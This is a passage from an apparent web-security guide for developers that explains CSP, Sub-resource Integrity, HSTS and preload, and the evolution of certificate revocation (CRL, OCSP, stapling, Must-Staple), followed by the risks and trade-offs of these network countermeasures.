Names are removed here to save embarrassment, as sadly most banks do not take their web security seriously enough and seem to take the same approach as credit card companies. Whereby, it appears to be cheaper for them to reimburse victims rather than making sure targets are never victimised in the first place. I would hope that this strategy will change as cybercrime becomes more prevalent, as it becomes cheaper to reduce the occurrences than to react after it has happened.

{linenos=off, lang=bash}
    curl --head https://reputable.kiwi.bank.co.nz/

    Content-Security-Policy: default-src 'self' secure.reputable.kiwi.bank.co.nz;
    connect-src 'self' secure.reputable.kiwi.bank.co.nz;
    frame-src 'self' secure.reputable.kiwi.bank.co.nz player.vimeo.com;
    img-src 'self' secure.reputable.kiwi.bank.co.nz *.g.doubleclick.net www.google.com www.google.co.nz www.google-analytics.com seal.entrust.net;
    object-src 'self' secure.reputable.kiwi.bank.co.nz seal.entrust.net;
    # In either case, authors SHOULD NOT include either 'unsafe-inline' or data: as valid sources in their policies. Both enable XSS attacks by allowing code to be included directly in the document itself.
    # unsafe-eval should go without saying.
    script-src 'self' 'unsafe-eval' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net www.googletagmanager.com www.googleadservices.com www.google-analytics.com;
    style-src 'self' 'unsafe-inline' secure.reputable.kiwi.bank.co.nz seal.entrust.net;

Of course, this is also only as good as a trusted client connection. If their connection is not over TLS, then there is no real safety from headers being changed. If the connection is over TLS, and the connection is intercepted before the TLS hand-shake, then the same lack of trust applies. See the section on [TLS Downgrade](#network-countermeasures-tls-downgrade) for more information.  
This is not to be confused with Cross Origin Resource Sharing (CORS). CORS instructs the browser to override the "same origin policy" thus allowing AJAX requests to be made to header-specified alternative domains. For example, a web site allows restricted resources on its web page to be requested from another domain outside the domain from where the resource originated. This specifically allows other domains access to its resources.

You can also evaluate the strength of a CSP policy by using the [google CSP evaluator](https://csp-evaluator.withgoogle.com/).

#### Sub-resource Integrity (SRI) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}
![](images/ThreatTags/PreventionEASY.png)

SRI provides the browser with the ability to verify fetched resources (the actual content) that have not been tampered with, specifically where expected resources may have been swapped or modified for a malicious resource, no matter where it comes from.

How it operates:  
Requested resources also have an `integrity` attribute with the cryptographic hash of the expected resource. The browser checks the actual hash against the expected hash. If they do not match, the requested resource will be blocked.

{linenos=off}
    <script src="https://example.com/example-framework.js"
        integrity="sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="
        crossorigin="anonymous"></script>


This is only useful for content that changes rarely, or is under your direct control. Scripts that are dynamically generated and out of your control, are not really a good fit for SRI. If they are dynamically generated as part of your build, then you can also embed the hash into the requesting resource as part of your build process. 
Currently, `script` and `link` tags are supported. Future versions of the specification are likely to expand this coverage to other tags.

SRI is also useful for applying the hash of minified, concatenated and compressed resources to their name in order to invalidate browser cache.

SRI can be used right now. While only the latest browsers are currently supporting SRI, the extra attributes are simply ignored by browsers that do not currently provide support.

Tools such as openssl and the standard SHA[256|512]sum programmes that are normally supplied with your operating system, will do the job. The hash value provided needs to be base64 encoded.

### TLS Downgrade {#network-countermeasures-tls-downgrade}

There are some great resources listed on the [https://httpswatch.nz/about.html](https://httpswatch.nz/about.html) page, for improving the HTTPS health of your web resources.

#### HTTP Strict Transport Security (HSTS) {#network-countermeasures-tls-downgrade-hsts}
![](images/ThreatTags/PreventionEASY.png)

Make sure your web server sends back the HSTS header. If you are using [hapijs](https://hapijs.com/api/) as your NodeJS web framework, it is on by default. In fact, hapi is one of the NodeJS web frameworks that has many security features on by default. This is also fairly straight forward if you are using ExpressJS, but you do need to use [helmetjs/hsts](https://github.com/helmetjs/hsts) to [enforce](https://helmetjs.github.io/docs/hsts/) `Strict-Transport-Security` in Express. For other environments it should be pretty straight forward as well, but do not just assume that HSTS is on by default, read the manual.

Then, trust the browser to do something to stop **downgrades**.

{linenos=off, lang=bash}
    curl --head https://reputable.kiwi.bank.co.nz/
    
    Strict-Transport-Security: max-age=31536000 # That's one year.

By using the HSTS header, you are telling the browser that your website should never be reached over plain HTTP.  
There is, however, still a small problem with this in the very first request for the website's page. At this point the browser has no idea about HSTS because it still has not fetched that first page that will come with the header. Once the browser does receive the header, if it does, it records this information against the domain. From then on, it will only request via TLS until the `max-age` is reached. So, there are two windows of opportunity there to conduct man-in-the-middle (MItM) attacks and downgrade `HTTPS` to `HTTP`. 

There is an NTP attack that can leverage the second opportunity. For example, by changing the target computer's date to two years in the future it is less likely to be noticed if the day, month and time remain the same. When a request for a domain that the browser expects to reach over TLS has its HSTS `max-age` expired, then the request goes out as `HTTP`, providing that the user explicitly sends it as `HTTP`, or clicks a link without `HTTPS`.

Details of how this attack plays out, and additional HSTS resources are provided in the Attributions chapter.

[Online Certificate Status Protocol (OCSP)](#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp) is very similar to HSTS, but at the X.509 certificate level.

#### HTTP Strict Transport Security (HSTS) Preload {#network-countermeasures-tls-downgrade-hsts-preload}
![](images/ThreatTags/PreventionEASY.png)

This includes a list of any domains that have been submitted for browsers to use. When a user requests one of the pages from a domain on the browser's HSTS preload list, the browser will always initiate all requests to that domain over TLS. The `includeSubdomains` token must be specified. Chrome, Firefox, Safari, IE 11 and Edge are including this list now.

In order to have your domain added to the browser's preload list, submit it online at the [hstspreload.org](https://hstspreload.org/). I don't see this scaling, but then not many have submitted their domains to it so far. Just be aware that if you submit your top level domain to the hstspreload list and for some reason you can not serve your entire web application or site over TLS, then it will be unreachable until you either fix it, or [remove](https://hstspreload.org/#removal) it from the hstspreload list and it propagates to all or your users browsers.

Domains added to the preload list are not susceptible to the newer SSLStrip2 - dns2proxy attack demonstrated at BlackHat Asia in 2014 by Leonardo Nve

[OCSP Must-Staple](#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp) is very similar to HSTS Preload, but at the X.509 certificate level.

#### X.509 Certificate Revocation Evolution {#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution}

This is a condensed version of the evolution.

1. Server generates a public key pair
2. Server keeps the private key for itself
3. Server gives the public key and some identifying information (domain, etc) to the Certificate Authority (CA) for them to bind to the certificate
4. Enduser browses to your website and receives the certificate from your server
5. The browser verifies that the URL it's fetched matches one of the URLs in the certificate. Certificates can have wildcards, or a collection of specific subdomains

All of the CAs now use intermediate certificates to sign your certificate, so that they can keep their root certificate off line. This is similar to what I did with GPG in my [blog post](http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/#master-key-pair-generation). If their main signing certificate is compromised, they can revoke it, and create another one from their root certificate. You can see the root, intermediate, and your certificate as part of the certificate chain when you check the details of a certificate in your browser.

With the Heartbleed attack, the server's private keys were located and stolen from RAM before they expired, so those keys had to be revoked. This allowed attackers who now had the private keys to set up a cloned website with the stolen private key(s), then divert traffic to the cloned website using the following techniques:

* Phishing (as discussed in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com))
* [DNS spoofing](#network-identify-risks-spoofing-dns)
* [ARP spoofing](#network-identify-risks-spoofing-arp)
* Many other attack vectors

Unfortunately, users would be non the wiser.

##### Initiative 1: Certification Revocation List (CRL)

CRLs are used when you find that your private key has been compromised, or you can no longer trust that it's still secret.  
First, you tell the CA that created your certificate, and bound your public key and identifying information to it.  
The CA then adds the serial number of the key you're requesting to be revoked to a list they publish.  
Now bound into each certificate, including the one you just requested revocation of, is a URL to a revocation list that will contain your certificates serial number if it's ever revoked.
This URL is known as the [Certification Revocation List (CRL)](http://en.wikipedia.org/wiki/Revocation_list) distribution point. Plenty of details can be found in the [specification](http://tools.ietf.org/html/rfc5280).

The browser **trusts** the certificate **by default**.  
If the browser decides to check the CRL and finds your revoked certificate's serial number, then it may issue a warning to you.  
The certificate can't be tampered with because, if it is, the signature that the browser knows about won't match that of the certificate being presented by the web server.

You can check the CRL yourself by just browsing to the CRL distribution point, then run the following command on the downloaded file to read it as it's binary.

{linenos=off, lang=bash}
    openssl crl -inform DER -text -in evcal-g5.crl

`DER` is the encoding  
`-inform` specifies the input format  
`-text` specifies the output format  
`-in` specifies the CRL file you want printed  

CRLs these days are getting larger and larger because more and more entities are using certificates. Now the certificate's serial number only stays on the CRL until shortly after the certificate expires, at which point the serial number is removed from the CRL. This is because there are more and more certificates being created, and the CRLs are getting larger. Of course, we only care about one certificates serial number, the browser fetches this entire CRL file just to find one serial number.

When you fetch a web page over TLS, before the browser will actually do so, it fetches the certificate from your web server, then downloads the CRL, then looks for your certificate's serial number, just in case it's on the list. All this is done before any page is fetched over TLS.

CRLs are generally published daily with a week expiration, which is shown in the CRL that you download. This, of course, allows a window of opportunity where the browser could still be using a cached CRL, even though a new CRL is available from the distribution point with a revoked certificate.

This wasn't such a big deal in the early days of the Internet when there were so few CAs, and in many cases the CRL that your browser had already downloaded was useful for many websites that you would visit.

Conscientious CAs segment their CRLs, so that when you make a request to the CRL distribution point, you get back a small list of serial numbers for revoked certificates.

##### Initiative 2: Online Certificate Status Protocol (OCSP) {#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp}

The next stage of evolution was [Online Certificate Status Protocol (OCSP)](http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol), which came to fruition in [1998](http://tools.ietf.org/html/rfc6960#page-31). Details can be found in the [specification](http://tools.ietf.org/html/rfc6960). With OCSP, another extension was added to certificates: Authority Information Access (AIA), whose value contains amongst other things `OCSP Responder:  
URI: http://<ocsp.specific-certificate-authorities-domain.com>`

With OCSP, instead of querying the CRL distribution point and getting back a potentially large list of certificate serial number revocations, the browser can query the OCSP for the specific single certificate's serial number, and ask whether it's still valid.

There have been some proposals to OCSP such that instead of having certificates last years, they could instead last only a few days, and it would be the responsibility of the web server to update the CA with a new certificate every few days. If it failed to do so, then the CA would be present an expired certificate, for which the browser would produce a warning to the user.  
The problem with this initiative was that we would have a long standing reliance on long-lived certificates with the likes of [**pinning**](http://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning). This short lived certificate proposal didn't stick. You can read more about pinning on the [OWASP Certificate and Public Key Pinning](https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning) page, and the [specification](https://tools.ietf.org/html/draft-ietf-websec-key-pinning-21).

Details of what an OCSP request should look like can be seen in 2.1 of the [OCSP specification](http://tools.ietf.org/html/rfc6960#section-2.1). There are plenty of examples to follow.

Details of what the OCSP response will look like can be seen in 2.2 of the [OCSP specification](http://tools.ietf.org/html/rfc6960#section-2.2). Notable items of the response are:

* Valid certificate status of `good` | `revoked` | `unknown`
* Response validity interval (How long the response is valid before the OCSP must be re-queried
* `thisUpdate`
* `nextUpdate`

The `thisUpdate` and the `nextUpdate` define the recommended validity interval. These are similar to the same fields in CRLs, but the interval with OCSP is usually much shorter, as the browser only has to send requests for single certificates.

##### One of the Big Problems

All CAs now support both CRLs and OCSP. One problem that we've seen, is that some of the responses for both CRLs and OCSP have been very slow or non-existent.  In which case browsers just continue to trust the validity of the certificate. If the revocation response can be blocked by an attacker, then the browser will continue to trust a certificate that was valid only the last time it managed to get a response of `good`.

##### Initiative 3: Welcome to [OCSP Stapling](http://en.wikipedia.org/wiki/OCSP_stapling)

In the case of OCSP stapling, the web server is responsible for making OCSP requests to the CA at regular intervals (not per client request)(generally several times per day) rather than the browser. The web server then "staples" the signed, time-stamped OCSP response (which generally expires daily) to the certificate supplied as part of the response from the web server to the browser.

The stapled response can't be forged as it must be signed directly by the CA. If the client does not receive a stapled response from the web server, it just contacts the OCSP itself. If the client receives an invalid stapled response, the connection will be aborted.

If no `good` response is received, then the certificate will be considered valid until the last signed OCSP response that was received (if one was) expires.

This is a much better solution. Clients can now have assurance that the certificate is currently valid or was valid at some point within the last few hours, which is a much smaller time window for an attacker.

The client no longer needs to contact DNS for the CA's IP address, nor does it have to contact the CA to fetch either a CRL or/and make a OCSP request, as the web server has already done so before the client makes a request to the web server. All the web server needs to do on each request from the client is staple the OCSP response to its response. Performance is improved significantly.

You can read the specification for OCSP stapling (officially known as the TLS "Certificate Status Request" extension in the [TLS Extensions: Extensions Definitions](http://tools.ietf.org/html/rfc6066#section-8).

OCSP stapling has been available since at least 2003. Windows Server 2003 and later all have it enabled by default. Most other web servers have it disabled by default.

For sake of compatibility, the browser must initiate the request for stapling. This happens after the transports TCP connection is established.

Most web servers currently on the Internet don't support OCSP stapling, because it's off by default on most non-Windows servers.

The following websites will tell you if a website supports OCSP, CRL, OCSP stapling and lots of other goodies:

* [digicert](https://www.digicert.com/help/)
* [ssl labs](https://www.ssllabs.com/ssltest/)

##### OCSP Stapling Problem

The client doesn't know whether the web server supports OCSP stapling or not. When the client asks if it does, the legitimate web server may support stapling, but the fraudulent web site that the client may be dealing with just says "no I don't support stapling", and the browser falls back to using OCSP or CRL.

##### Initiative 4: Fix for the OCSP Stapling Problem {#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp}

[OCSP Must-Staple](https://wiki.mozilla.org/CA:ImprovingRevocation) now provides us with a hard-fail option. When you submit a certificate request to the CA, there will be an option for "must staple". It's still to be determined what this is actually going to be called. If you request that your new certificate have the "must staple" option listed, it can't be removed by an attacker because, again, that would break the signature that the browser knows about.

The browser, on its first request to the web server, tells the web server that it supports stapling, and if the web server can provide a certificate with a stapled OCSP response, we want it. The web server then responds with the certificate that has "must staple" cryptographically bound to it. Now, if the legitimate web server says "no I don't support stapling", the browser won't accept it, because "must staple" is part of the certificate.

There are two ways that "must staple" is being looked at as a solution. The [OCSP Must-Staple](https://casecurity.org/2014/06/18/ocsp-must-staple/) section of the article of the same name on the casecurity.org blog provides some details.

1. [In the certificate](http://tools.ietf.org/html/draft-hallambaker-tlssecuritypolicy-03) as discussed above
2. An [interim solution](https://wiki.mozilla.org/CA:ImprovingRevocation#OCSP_Must-Staple) that doesn't look like much of a solution to me. It adds a `Must-Staple` header to the response, which can be easily stripped out by a MItM attack on the very first response. This solution is very similar to HSTS as discussed [above](#network-countermeasures-tls-downgrade-hsts). If you want similar behaviour to the [HSTS Preload](#network-countermeasures-tls-downgrade-hsts-preload), also discussed above, then "must staple" has be part of the certificate.

As far as I know, Firefox and Chrome are both working toward implementing Must-Staple in their certificates, but I haven't seen or heard anything yet for Internet Explorer and Edge.

## 4. SSM Risks that Solution Causes {#network-risks-that-solution-causes}

### Fortress Mentality

Preventing work devices to be taken from the premises is a fairly archaic technique which would likely have a significant negative impact on the business. Businesses want their travelling personnel, and even their developers and engineers to be able to take their work devices home on evenings and weekends.

Having a separate wireless network for your workers to access the Internet is not sufficient for them to get their work done.

All of the technical solutions are costly, and they are only part of the solution.

### Lack of Segmentation

If you make it harder for a determined attacker to compromise your network resources, they may change their approach towards exploiting your people, or find other means that are easier. When you raise the low hanging fruit, then something else becomes the new low hanging opportunity. 

Firewalling your network segment's gateway interface, and inspecting everything that should be a permitted safe passage out of the given network segment, imposes restrictions. I often find that people are expecting to be able to access something via the network segment's gateway interface but unable to do so because it has not been explicitly allowed.

Applications exist that continue to target random ports in order to function, the real-time chat application Discord is one of these. These can be a real pain for tightened gateway interfaces if the application is mandatory.

### Lack of Visibility

Following are some of the risks inherent to the mentioned solutions.

#### Insufficient Logging

With the test cases we set up there was no ideal solution, it would be a matter of choosing the options that worked best for you, or finding something else that worked.

#### Lack of Network Intrusion Detection Systems (NIDS)

As mentioned in the Countermeasures section, there are some pros and cons to signature vs anomaly based detection techniques. Choosing a tool-suite that uses both can help mitigate the risks discussed. You will also need to consider what each product offers in terms of features, how mature it is, and what the risks of each would be to your environment and business.

### Spoofing

Most of the spoofing mitigations don't introduce a lot of risk.

#### IP

Additional complexity will be added to your router configuration.

#### ARP (Address Resolution Protocol)

Additional complexity will be added to your IDS configuration.

#### DNS

Additional complexity will be added to your name server's configuration.

#### Referrer

No risks here, if you work out who should be able to access what, and make the appropriate code changes.

### Data Exfiltration, Infiltration

#### Dropbox

There will be NI[D|P]S configurations required to monitor file sync tools, such as Dropbox, which is extra work, and depending on how Dropbox is used, may just fail. Blocking file sync tools may be an option.

#### Physical

Per the Infectious Media subsection of Risks that Solutions Cause in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).

#### Mobile Phone Data

In most cases, what ever you do to stop cell phone signals escaping your premises, servers or computers. It is either going to be ineffective, or significantly disadvantage your organisation, both in terms of productivity and morale. Since when have attackers played by the rules of their victims?

#### DNS, SSH

Employees will always find a way to get around organisational policy if it stops or slows their work down.

It can be a lot of work to have HIDS running on all systems, and it's impractical.

Not all antivirus' are created equal. The next generation antivirus/antimalware with machine learning is expensive.

NIDS setup and administration takes a lot of work for any security operations team. Often organisations will outsource this.

There may be a legitimate reason for allowing DNS `TXT` records, obviously you will not be able to block them if that is the case.

### Doppelganger Domains

There are no real risks with acquiring domains, perhaps cost.

### Wrongful Trust When Loading Untrusted Web Resources {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources}

#### Content Security Policy (CSP) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}

Trusting that (all supported) browsers to do the right thing.  
Don't. Remember defence in depth. Expect each layer to fail, but do your best to make sure it does not. Check the likes of OWASP [How Do I Prevent Cross-Site Scripting](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) to take responsibility yourself rather than deferring trust to the clients browser.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure, or in a pre-commit hook on source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

#### Sub-resource Integrity (SRI) {#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri}

This is similar to the above in trusting the browser to support the SRI header. All requests should be made over HTTPS. The server should not respond to any requests for unencrypted data.

Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure on a pre-commit hook or source control.

Make sure your web server only ever responds over HTTPS, including the very first response.

### TLS Downgrade {#network-risks-that-solution-causes-tls-downgrade}

#### HTTP Strict Transport Security (HSTS) {#network-risks-that-solution-causes-tls-downgrade-hsts}

Unless browsers know about your domain, and have it added to their HSTS Preload list, the connection will still not be safe on the very first request, unless your server refuses to serve without TLS, which should be the case.

#### HTTP Strict Transport Security (HSTS) Preload {#network-risks-that-solution-causes-tls-downgrade-hsts-preload}

Ultimately, if you have done you job correctly, you are trusting the browser to honour your decision not to communicate at all unless TLS is supported.

If you make sure your web server only ever responds over HTTPS, including the very first response, then the HSTS preload may work for you, just be aware that once your domain is in the list, it is only reachable over HTTPS

## 5. SSM Costs and Trade-offs {#network-costs-and-trade-offs}

### Fortress Mentality

Your workers still need to connect to the corporate LAN, so put policies in place to make sure what ever they connect:

* Has a local firewall enabled and is configured correctly to protect from insecure services
* Must be fully patched
* Anti-virus on systems that need it, with current rule sets
* Ability to authenticate itself, what ever technique you decide to use

The technical solutions described are costly, but building a motivated and engaged work force is not, it just requires a little thought and action on behalf of those in charge.

The best you can do is care and show you care for your workers. This all comes back to what we discussed in the People chapter of [fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/) around engaged and well looked after workers.

People will be your weakest or your strongest line of defence, it is up to you.

### Lack of Segmentation

Depending on your scenario and threat model, determine what the next lowest hanging fruit is, then you can harden or remove that attack surface, and continue working your way up the tree.

If you can explain why you have tight egress rules, then people will usually be accepting.

If you are constrained to using software that insists on changing what port it wants to communicate on, discuss this along with the perils of leaving large port spaces open with those mandating the tool. If you can not have the tool configured to communicate on a specific port and you do not get any traction with changing the tool, at least lock the outbound port space down to specific hosts and protocols.

### Lack of Visibility

Following are some costs and trade-offs for lack of visibility. Your mileage may vary. As noted below, this is one area that moving your business to the cloud frees up a lot of work you would have to do otherwise.

#### Insufficient Logging

Any of the options I have detailed take time to set up, depending on the size of your network. Taking into consideration what you are protecting will help you decide on which of the options will work the best, or investigate some other options.

This is one area that moving to the cloud makes sense, let your cloud provider take care of the infrastructure, and you make sure you have your configuration and application security water tight.

#### Lack of Network Intrusion Detection Systems (NIDS)

Most of this has been covered in the Countermeasures section.

### Spoofing

It's really up to you to determine how much time you should spend on solutions.

### Data Exfiltration, Infiltration

#### Dropbox

You will need to determine whether stopping file sync tools will damage productivity, and by how much.

#### Physical

Per the Infectious Media subsection of Costs and Trade-offs in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).

#### Mobile Phone Data

There are many scenarios to be considered here.

#### DNS, SSH

Strike a balance between security and pragmatism.

You should consider having host intrusion detection systems (HIDS) running on critical servers. Depending on your security requirements, you could extend these to other work stations, but this increases the administrative overhead.

In many cases, the extra expense of the newer anti-virus products is worth the expenditure. You will have to weigh this up.

Setting up and maintaining a network intrusion detection system (NIDS) is pretty much a given for any medium to large sized business network. There are many arguments whether an organisation should run their own in house security operations team. This will often come down to the size of the organisation, whether or not you already have some of the specialities required in house, what your assets are, who your adversaries are, how long you plan on staying in business, and many other considerations. This is all part of your threat modelling.

You could inspect the DNS records, this is where your NIDS comes in.

### Doppelganger Domains

Determine what your attack surface looks like in terms of doppelganger domains, acquire domains with obvious similarities that users could mistakenly type. Determine when to stop purchasing the doppelganger domains.

### Wrongful Trust When Loading Untrusted Web Resources

#### Content Security Policy (CSP)

Any countermeasure costs here are fairly trivial.

#### Sub-resource Integrity (SRI)

Any countermeasure costs here are fairly trivial.

### TLS Downgrade

#### HTTP Strict Transport Security (HSTS)

Make sure your server only serves responses over HTTPS.

#### HTTP Strict Transport Security (HSTS) Preload

It may make sense to not add your domain to the preload list, but make sure that resources from your domain are not accessible, unless over HTTPS. There are many ways to do this. 
